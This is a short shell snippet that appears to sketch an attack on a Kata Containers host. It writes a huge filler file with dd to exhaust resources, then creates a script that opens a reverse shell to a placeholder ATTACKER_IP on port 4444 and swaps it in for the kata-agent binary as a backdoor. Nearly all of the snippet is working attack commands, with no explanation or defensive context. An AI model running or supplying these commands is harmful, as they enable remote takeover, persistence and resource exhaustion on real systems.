# Fill memory with junk to force cache eviction
dd if=/dev/zero of=/tmp/filler bs=1M count=999999 2>/dev/null

# Example: Overwrite a shared library (e.g., libc) or init script
echo -e '#!/bin/sh\n/bin/sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /usr/bin/bisous
chmod +x /usr/bin/bisous
mv /usr/bin/kata-agent /usr/bin/kata-agent.backup
mv /usr/bin/bisous /usr/bin/kata-agent